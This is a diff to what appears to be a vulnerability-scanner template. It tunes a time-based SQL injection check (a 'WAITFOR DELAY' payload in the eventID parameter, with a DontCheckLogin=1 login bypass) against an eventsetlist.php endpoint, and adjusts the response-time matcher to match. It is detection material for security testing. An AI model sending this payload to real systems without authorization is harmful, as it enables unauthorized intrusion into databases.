@@ -8,7 +8,7 @@
 ## verification: true
 
 
-GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:10'-- HTTP/1.1
+GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
 Host: {{Hostname}}
 User-Agent: {{random_ua}}
 Cookie: PHPSESSID=bgsesstimeout-;
@@ -16,7 +16,7 @@ Cookie: PHPSESSID=bgsesstimeout-;
 
 #@ timeout: 20
 #@ condition: and
-#@ matcher: response_time > 10
+#@ matcher: response_time >= 5
 #@ matcher: header["Content-Type"] contains "html" 
 #@ matcher: body contains "Database" || body contains "Microsoft"
 
@@ -25,4 +25,4 @@ Cookie: PHPSESSID=bgsesstimeout-;
 
 
 
-# @VEIL-STAMP: dc696a6a5b9961537cd3614566ea5be1d8df40e73df71cd62c18a4fdf93cb9eb
+# @VEIL-STAMP: 43ed91130ff97d0bc13eccafda56b2df05de0d36440c989d9dcbaaea13e7971d
